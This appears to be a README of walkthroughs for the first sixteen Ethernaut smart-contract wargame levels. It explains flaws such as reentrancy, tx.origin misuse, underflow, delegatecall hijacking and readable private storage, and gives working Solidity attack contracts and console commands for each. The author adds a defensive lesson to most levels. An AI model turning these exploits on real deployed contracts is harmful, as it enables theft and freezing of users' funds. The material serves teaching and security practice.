# Solutions to the Ethernaut challenges

This repo is all about me solving the ethernaut challenges and giving you hints on how to solve thewm yourselves.

## 0. Hello Ethernaut

The goal of this level is to get fmiliar with how to interact with the current instance through the developer console. We can type in a few keywords to interact with the contract, hint: typeawait contract.password(). and you can try this too "await contract.info()".

## 1. Fallback

This is practically the first challenge and the main aim of this level is that we become the owner and reduce the balance of the contract to 0.

Note that there are only two types of accounts on Ethereum: Externally Owned Accounts (EOAs) and Smart Contract accounts. EOAs are basically user wallet addresses and they represent users interacting with Ethereum. Smart Contract accounts are accounts owned by contracts.
Let's start by figuring out how to become the owner. If you look at the contract code, the only feasible way of becoming the owner is to trigger the `receive` function. There is a `require` statement that needs to pass so we will call the `contribute` function and specify any value less than 0.001 ETH.

Thereafter we will initiate a plain ETH transfer into the contract to become the owner. To complete the second requirement, we will call the `withdraw` function to withdraw the funds out.

```
await contract.contribute({value: 1437});
await contract.send({value: 1437});
await contract.withdraw();
```

KEY NOTE FROM CHALLENGE:

We can send money to a Smart Contract using its fallback function (a function with no name); however, the preferred way of programming a contract to receive Ether is by adding the receive() function.

## 2. Fallout

After this challenge, we understand what an ABI (Application Binary Interface) is . I like to think of it as the public API of a Smart Contract that you can interact with from a JavaScript front-end.
In earlier versions of solidity, the constructor of a contract is defined by a function with the same name as the contract i.e. if your contract name is `Treat`, the name of your constructor needs to be `Treat` as well.

From solidity 0.5.0, this is no longer the case but we should take note here — contracts can have malicious functions that are hidden in plain sight. In this ethernaut level, the function `Fal1out` is spelt incorrectly. It is very easy to miss out on this when skimming through the code.

To become the owner, we just call the `Fal1out` function.

```
await contract.Fal1out({value: 1437});
```

## 3. Coinflip

We learn some cool things in this challenge. Like, how _not_ to introduce randomness into our Smart Contracts.

The goal of this level is to guess the `side` correctly 10 times in a row. The chance of this happening is 0.5^10 or 0.0009765625% which _might_ happen but very very unlikely. Luckily for us, the contract has a flaw with their flipping algorithm, specifically relying on `block.number` as a form of randomness.
Note that generating randomness in computing is generally difficult (if not impossible). It's even more difficult in Smart Contracts because everyone can read our contract code (provided we've published the source code which we will always be expected to do).
So someone with the wrong intent or smart as some would say can always calculate the correct answer if they run the same algorithm in their attack function before calling your flip function.
If we deploy the following contract on remix and call the `attack` function, we can take over the victim contract.

```
pragma solidity ^0.8.0;

contract CoinflipAttack {
    address victim = 0x9010BCEbf802A031eabB52B22F3ec1331D923bBd;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        // Below is the same algorithm that is used by the victim contract
        // We calculate the value for side before calling the victim contract.
        // Note that will always be correct since both functions are called in the same block.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Normally we would use import the contract here so that we can call the function directly, but this works as well.
        // This approach is useful for when we don't have access to the source code of the contract we want to interact with.
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = victim.call{value: 0 ether}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

MAIN LESSON FROM CHALLENGE:
If there is a need to introduce randomness into our contract, we use a decentralized oracle to compute random numbers. That's because there's no native way in Solidity to generate a random number. And everything you write in a Smart Contract is publicly visible, including local and state variables marked as private.

## 4. Telephone

Here we learn the nuance between using the global variables "tx.origin" and "msg.sender". And we also learn the proper way to do authorization checks in our contract functions.
The way to hack this level is to understand how tx.origin works. When we call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that initiated the function from which is tx.origin.
Using the following contract on remix and calling the `hackContract` function to take over the victim contract, dont forget that we need to copy and paste the code to this level to remix inorder to be able to import it and successfully hack the level

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneHack {
    Telephone tellContract;
    constructor(address _address) public {
        tellContract = Telephone(_address);
    }
    function hackContract(address _address) public {
        tellContract.changeOwner(_address);
    }
}
```

MAIN LESSON FROM CHALLENGE:
We should never use tx.origin for authorization in the functions of our contracts.

## 5. Token

In this level, we are going to dive a bit into arithmetic operations in Solidity and also how numbers are stored in solidity memory, also with this we see what can go wrong if we make a mistake when perfoming arithmetic operations in solidity.
But with the release of Solidity v0.8 we don't have to use Open Zeppelin's SafeMath library for arithmetic operations anymore! SafeMath is now automatically integrated into our contracts when we set the pragma directive to 0.8 and above. With this upgrade to Solidity, our code will automatically revert on overflows and underflows.

To become the owner of this contract, we just need to pass a value > 20 since the condition in the first require statement will underflow and therefore will always pass.
balances[msg.sender] -= \_value; This is where we can trigger an arithmetic underflow and we use the transfer function to hack this smart contract
So we just get a random ETH address and then pass it 20 + 1 tokens since we are the msg.sender and we have just 20 tokens, the tx goes through but we end up with more than 20 cause of the underflow.

```
await contract.transfer(instance, 21)
```

## 6. Delegation

Delegate in itself basically means to entrust a task or responsibility to someone else.
DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract.
The delegatecall function should only be used with extreme care because it's particularly risky. Side note, it's been used as an attack vector on a lot of historic hacks including The Parity Wallet Hack which allowed an attacker to steal over ~$30,000,000 USD.
So main key here is to get a function signature for the pwn function, and we can do this by using the sha 3 web 3 tool, which we get by creating the variable of the pwnFunctionSignature
By using
var pwnFuncSignature = web3.utils.sha3("pwn()")
And then we pass the data and key for our pwnfuncsignature using
contract.sendTransaction({data: pwnFuncSignature})
So now we check the contract owner once again and we see that it’s being changed to us.

```
var pwnFuncSignature = web3.utils.sha3("pwn()")

contract.sendTransaction({data: pwnFuncSignature})
```

MAIN LESSON FROM CHALLENGE:
When we use delegatecall, we're reusing another contract's code but also giving it access to our contract's state variables. Because delegates have complete access to the contract's state, use with extreme caution because delegatecall is risky and has been used as an attack vector before.!

## 7. Force

We all know that there are afew ways to send ether to a contract, we can do this by:

1. adding a fallback function (a function with no name) that's modified as "payable"
2. adding a receive() function
3. adding a function and specifying it with the "payable" keyword

But if none of the above are added to the code of a contract, there is still one additional technique that can be used to forcefully send ETH to a contract through the use of `selfdestruct`. deploying this contract through remix, also don't forget to specify value before deploying the ForceAttack contract or the `selfdestruct` won't be able to send any ETH over as there are no ETH in the contract to be sent over!

```
pragma solidity ^0.4.0;

contract ForceAttack {
    constructor () public payable {

    }
    function attack (address _contractAddr) public {
        selfdestruct(_contractAddr);
    }
}
```

MAIN TAKEAWAY FROM CHALLENGE:

If a Smart Contract is not programmed to receive Ether, there's still a way we can force money into it. We write a separate contract that self destructs by calling the global selfdestruct() function which takes an address as a parameter. And right before our contract self destructs, it sends the specified address all of its remaining balance!

## 8. Vault

Here we mostly learn about about storage on smart contracts and also how we can access a variable by its index in a smart contract.
If we try accesing the private variables via another contract then they are private but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, anyone can still access it based on its index in the smart contract.

```
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```

MAIN TAKEAWAY FROM CHALLENGE:
Data on a blockchain is never confidential, and that's because contracts store their data in their designated storage on Ethereum which anyone can query!

## 9. King

This level of the challenge is going to show us how a once popular Ponzi Scheme on Ethereum - King Of The Ether - got hacked.
This is an example of DDoS with unexpected revert when the logic of the victim's contract involve sending funds to the previous "lead", which in this case is the king. Someone with bad intention can just create a smart contract with either:

- a `fallback` / `receive` function that does `revert()`
- or the absence of a `fallback` / `receive` function

Since the global variable msg.sender can represent either an Externally Owned Account (a.k.a. user wallet with private key) or Smart Contract Account, once a malicious user uses the smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter how much ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`

```
pragma solidity ^0.8.0;

contract KingAttack {

    constructor(address _victimAddress) payable {
        _victimAddress.call{value: 10000000000000000 wei}("");
    }

    receive() external payable {
        revert();
    }
}
```

## 10. Re-entrancy

This is the same exploit that led to the [DAO hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). This was such a collosal attack that it caused the Ethereum blockchain to fork into the official Ethereum blockchain and Ethereum Classic.

There is a pattern called Checks - Effects - Interactions in Solidity.
So basically, we check whether we can do something, such as checking balance, we then apply the effects of doing it on our contract, such as updating balance then we do the actual interactions on-chain with other, such as transferring money.
In this case, the function is withdraw but the interaction comes before the effect. This means that when we receive money from within the withdraw, things are briefly in our control until the program goes back to the withdraw function to do the effect. When we have the control, we can call withdraw once more and the same thing will happen again and again.

When we create the instance in this level we can see that the contract balance has a bit of ether where as we don't have any balance. using the below to check in the terminal

```
await getBalance(contract.address)
await contract.balanceOf(player)
```

We will donate some money to create our initial balance at the target, which will allow the balances[msg.sender] >= \_amount to be true. Now, we can repeadetly withdraw that amount by re-entering the withdraw function. Since balance update effect happens after the transfer interaction, this will go on and on until the balance is depleted. As a defense, we could use a pull-payment approach: the account to be paid must come and withdraw their money themselves, rather than us paying to them, thisis also the method thats used in the minimalistic nft marketplace i deployed on IPFS used.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface of the target contract
interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Attacker {
  address public owner;
  IReentrance targetContract;
  uint targetValue = 0.001 ether;

  constructor(address payable _targetAddr) payable {
    targetContract = IReentrance(_targetAddr);
    owner = msg.sender;
  }

  // withdraw money from this contract
  function withdraw() public {
    require(msg.sender == owner, "Only the owner can withdraw.");
    (bool sent, ) = msg.sender.call{value: address(this).balance}("");
    require(sent, "Failed to withdraw.");
  }

  // begin attack by depositing and withdrawing
  function attack() public payable {
    require(msg.value >= targetValue);
    targetContract.donate{value:msg.value}(address(this));
    targetContract.withdraw(msg.value);
    targetValue = msg.value;
  }

  receive() external payable {
    uint targetBalance = address(targetContract).balance;
    if (targetBalance >= targetValue) {
      // withdraw at most your balance at a time
      targetContract.withdraw(targetValue);
    } else if (targetBalance > 0) {
      // withdraw the remaining balance in the contract
      targetContract.withdraw(targetBalance);
    }
  }
}
```

MAIN TAKEAWAY FROM CHALLENGE:
Always update state variables before calling functions on external contracts. And also never forget to adhere to the mutex pattern or the Checks-Effects-Interactions pattern.

## 11. Elevator

This level is pretty tricky, but main thing here is that we should always be conscious of the visibility specifiers and state modifiers we choose to use in our function signatures. Since we don't always want certain functions to modify the state, we need to make sure that we select the right specifiers/modifiers.
So to pass this level we can head on to remix, pass on the elevator contract and also create our elevatorAttack contract, then we call the setTop function.

```
pragma solidity ^0.6.0;


interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

```
pragma solidity ^0.6.0;
import './elevator.sol';

contract elevatorAttack {
    bool public toggle = true;
    Elevator public target;


    constructor(address _targetAddress) public {
        target = Elevator(_targetAddress);
    }

    function isLastFloor(uint) public returns (bool) {
        toggle =!toggle;
        return toggle;
    }

    function setTop(uint _floor) public {
        target.goTo(_floor);
    }
}
```



## 12. Privacy
This is similar to the 8th level Vault, where we read the EVM storage. Here in addition, we learn about a small optimization of EVM and how casting works.

EVM stores state variables in chunks of 32 bytes. If consecutive variables make up a 32-byte space (such as in this case 8 + 8 + 16 = 32) they are stored in the same chunk. If we were to write them elsewhere, this optimization may not have happened. 

Using this to check for the results for the values of i.

```
let storage = []

let callbackFNConstructor = (index) => (error, contractData) => {
  storage[index] = contractData
}

for(var i = 0; i < 6; i++) {
  web3.eth.getStorageAt(contract.address, i, callbackFNConstructor(i))
}

```
0: 0x0000000000000000000000000000000000000000000000000000000000000001 This is the bool public locked = true which is stored as 1.
1: 0x0000000000000000000000000000000000000000000000000000000062bc6f36 This is the uint256 public ID = block.timestamp which is the UNIX timestamp in hex, 62bc6f36 (of this block in my instance])
2: 0x000000000000000000000000000000000000000000000000000000006f36ff0a This is the 32 byte chunk of 3 variables all captures in 6f36ff0a:
uint8 private flattening = 10 which is 0a
uint8 private denomination = 255 which is ff
uint16 private awkwardness = uint16(now) which is 6f36. Well, that awkwardness variable is just the block.timestamp casted to 16-bits. We already know the actual 256-bit (32-byte) value of timestamp above: 62bc6f36. When casted down 16-bits, it became 6f36 (4 x 4-bit hexadecimals).
3: 0x0ec18718027136372f96fb04400e05bac5ba7feda24823118503bff40bc5eb55 This is data[0].
4: 0x61a99635e6d4b7233a35f3d0d5d8fadf2981d424110e8bca127d64958d1e68c0 This is data[1].
5: 0x46b7d5d54e84dc3ac47f57bea2ca5f79c04dadf65d3a0f3581dcad259f9480cf This is data[2].
Now we just need data[2] casted down to bytes16. Here is how casting works in very few words:

Conversion to smaller type costs more signficant bits. (e.g. uint32 -> uint16)
Conversion to higher type adds padding bits to the left. (e.g. uint16 -> uint32)
Conversion to smaller byte costs less significant bits. (e.g. bytes32 -> bytes16)
Conversion to larger byte add padding bits to the right. (e.g. bytes16 -> bytes32)
So, when we cast down data[2] we will get the left-half of it: '0x46b7d5d54e84dc3ac47f57bea2ca5f79c04dadf65d3a0f3581dcad259f9480cf'.slice(0, 2 + 32) and then await contract.unlock('0x46b7d5d54e84dc3ac47f57bea2ca5f79'). That is all! 



MAIN TAKEAWAY FROM CHALLENGE:

Nothing is private on the Ethereum blockchain!

State variables get stored in index-based slots, and the order of how we list our variables in our contracts matter.  Ordering our contract's state variables inefficiently can result in poorly optimized storage space which will lead to higher gas costs.

Casting is the process of converting a variable of one type to another type.  Because Solidity is a strictly typed language, we need to know how to do this.

## 13. Gatekeeper One

This level is probably the most challenging so far since we'll need to be able to pass 3 obstacles to be able to register as an entrant.

1. Simple msg.sender != tx.origin.
2. A cute gasLeft().mod(8191) == 0.
3. A series of require's telling us what the gate key must look like.

Gate 1
Solution to the first gate is trivial, just use a contract as a middleman. From previous puzzles we have learned that msg.sender is the immediate sender of a transaction, which may be a contract; however, tx.origin is the originator of the transaction which is usually us.

Gate 2
Here we need to adjust the gas used in the transaction. We can do this by specifying the gas to be forwarded similar to how we specify ether value: foo{gas: ...}(). To find the proper gas amount is the tricky part, because we don't know exactly how much gas we will have by then. Here is what we can do: we will find a good approximate gas value, and then brutely try a range of values around it. The steps to do that is as follows:

```
  function enterOnce(uint _gas) public {
    bytes memory callbytes = abi.encodeWithSignature(("enter(bytes8)"),key);
    (bool success, ) = target.call{gas: _gas}(callbytes);
    require(success, "failed");
  }
```

Copy paste the contract in Remix, and try to enter the gate (assuming that gate 1 is passing at this point). I wrote a small utility for this in my attacker contract, shown above.

Unless we are extremely lucky, the transaction will be rejected by this gate. That is ok, because we want to debug it!

Debug the transaction in Remix to get to the GAS opcode, which is what gasleft() is doing in the background. There, we will look at the remaining gas field in "Step Details". We can easily get there in several ways:

Clicking "Click here to jump where the call reverted." and then going backward a bit until you find the opcode.
Putting a breakpoint to the line with gasleft() and clicking right arrow at the debugger, which will go very close to that opcode.
Another cool way is to actually get inside the SafeMath libraries modulus function, and then look at the local variables in the debugger. One of them will be 8191, the other will be the gas in question.
In my case, I had forwarded 10000 gas and right at the GAS opcode I had 9748 left. That means I used 252 gas to get there. If I start with 8191 \* k + 252 gas for some large enough "k" to meet the overall gas requirement, I should be okay! The thing is, gas usage can change with respect to the compiler version, but in the puzzle we see that ^0.6.0 is used above, so we will do all the steps above with that version.

I set the gas candidate as 8191 \* 5 + 252 = 41207 with a margin of 32. Then I let it loose on the gate keeper!

function enter(uint \_gas, uint \_margin) public {
bytes memory callbytes = abi.encodeWithSignature(("enter(bytes8)"),key);
bool success;
for (uint g = \_gas - \_margin; g <= \_gas + \_margin; g++) {
(success, ) = target.call{gas: g}(callbytes);
if (success) {
correctGas = g; // for curiosity
break;
}
}
require(success, "failed again my boy.");
}
It was successful, and I also kept record of the correct gas amount which turned out to be 41209.

Gate 3
We are using an 8-byte key, so suppose the key is ABCD where each letter is 2 bytes (16 bits).

CD == D so C: must be all zeros.
CD != ABCD so AB must not be all zeros.
CD == uint16(tx.origin): C is already zeros, and now we know that D will be the last 16-bits of tx.origin.
So, my uint16(tx.origin) is C274; and I will just set AB = 0x 0000 0001 to get \_gateKey = 0x 0000 0001 0000 C274. Alternatively, you can use bitwise masking by bitwise-and'ing (&) your tx.origin with 0x FFFF FFFF 0000 FFFF.

That is all folks :)

## 14. Gatekeeper Two

Very similar to the previous level except it requires us to know a little bit more about bitwise operations (specifically XOR) and about `extcodesize`.

1. The workaround to `gateOne` is to initiate the transaction from a smart contract since from the victim's contract pov, `msg.sender` = address of the smart contract while `tx.origin` is your address.
2. `gateTwo` is a bit tricky because how can both extcodesize == 0 and yet msg.sender != tx.origin? Well the solution to this is that all function calls need to come from the constructor!
   Here is the real gate

```
modifier gateTwo() {
  uint x;
  assembly { x := extcodesize(caller()) }
  require(x == 0);
  _;
}
```

The extcodesize basically returns the size of the code in the given address, which is caller for this case. Contracts have code, and user accounts do not. To have 0 code size, you must be an account; but wait, how will we pass the first gate if that is the case? Here is the trick of this gate: extcodesize returns 0 if it is being called in the constructor!  
In short, we have to execute our attack from within the constructor, cause when we first deploy a contract, the extcodesize of that address is 0 until the constructor is completed!
Check this stack convo for more understanding on extcodesize "https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract/15642#15642"

3. `gateThree` is very easy to solve if you know the XOR rule of `if A ^ B = C then A ^ C = B`.
   This is an XOR operation (often denoted with ⊕), and there is really only one parameter we can control here: the gate key. XOR has the property that if the same value XORs itself they cancel out; also, XOR is commutative so a ⊕ b = b ⊕ a. Starting with a ⊕ b = c, XOR both sides with a we get a ⊕ a ⊕ b = c ⊕ a, and the left side cancels out to give b = c ⊕ a.

One more thing: (uint64(0) - 1) causes is not really good for Solidity, and even caused gas estimation errors for me! The result is basically the maximum possible value of uint64, and we have a cool way to find it via type(uint64).max.

We can safely find the gate key as:

```
bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
```

Note that as of solidity 0.8.0, you cannot do uint64(0) - 1 unless it's done inside an uncheck scope.

```
pragma solidity ^0.8.0;

contract AttackGatekeeperTwo {

    constructor(address _victim) {
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", _key);
        (bool success,) = _victim.call(payload);
        require(success, "failed...");
    }

    function passGateThree() public view returns(bool) {
        // if a ^ b = c then a ^ c = b;
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1
        // would be rewritten as
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) - 1 == uint64(_gateKey)
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max;
        return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ key == type(uint64).max;
    }
}
```

MAIN TAKEAWAY FROM CHALLENGE:

Checking for a contract's code size during construction of that contract using the EXTCODESIZE opcode, you're going to get an empty value because the contract has not been fully constructed yet. During construction, the contract will receive a pre-made address but its size will be zero until construction is complete.
We can create zombie contracts by stopping a contract's initialization. Meaning, the contract has an address but no associated code.

## 15. Naught Coin

Here we have a simple ERC-20 contract in our hands, that prevents us to transfer money to someone. However, this does not prevent us to approve that someone, and let them call transferFrom to take our money. That is precisely what we are going to do. We create and deploy a simple contract, Perhaps this is just to us developers to be careful when implementing the business logic and to ensure that other functions cannot somehow bypass it e.g. using `transferFrom` to bypass the `lockTokens` modifier on `transfer`.

The solution is to just approve another address using the below contract;

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

contract NaughtWithdraw {
  function withdrawFrom(address _tokenAddr, address _from, uint _amount) public {
    bool success = IERC20(_tokenAddr).transferFrom(_from, address(this), _amount);
    require(success, "failed!");
  }
}
```

MAIN TAKEAWAY FROM CHALLENGE:

There are two ways to transfer tokens from an ERC20 token: by using the transfer() method, or performing a delegated transfer by using both approve() and transferFrom() in conjunction with each other. With delegated transfers, an account can approve another account to send tokens on its behalf.

